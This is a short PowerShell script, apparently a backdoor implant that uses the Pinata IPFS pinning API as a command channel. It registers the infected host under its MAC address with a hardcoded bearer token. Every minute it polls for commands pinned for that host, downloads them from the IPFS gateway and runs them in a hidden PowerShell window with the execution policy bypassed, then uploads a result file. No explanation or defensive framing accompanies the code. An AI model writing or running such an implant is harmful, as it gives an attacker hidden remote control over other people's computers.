$mac = (Get-NetAdapter | Select-Object -First 1).MacAddress
$jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySW5mb3JtYXRpb24iOnt9fQ.abcdefghijklmnopqrstuvwxyz012345"
$log = "C:\Users\Public\$mac.log"
"hi" | Out-File $log
Invoke-RestMethod -Uri "https://api.pinata.cloud/pinning/pinFileToIPFS" -Method Post -Headers @{Authorization="Bearer $jwt"} -InFile $log
while ($true) {
  $q = Invoke-RestMethod -Uri "https://api.pinata.cloud/data/pinList?status=pinned&metadata[name]=$mac.txt" -Headers @{Authorization="Bearer $jwt"}
  $cid = $q.rows[0].ipfs_pin_hash
  if ($cid) {
    $cmd = (Invoke-WebRequest -Uri "https://gateway.pinata.cloud/ipfs/$cid").Content
    Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -Command $cmd"
    Invoke-RestMethod -Uri "https://api.pinata.cloud/pinning/pinFileToIPFS" -Method Post -Headers @{Authorization="Bearer $jwt"} -InFile "C:\Users\Public\${mac}re.txt"
  }
  Start-Sleep -Seconds 60
}
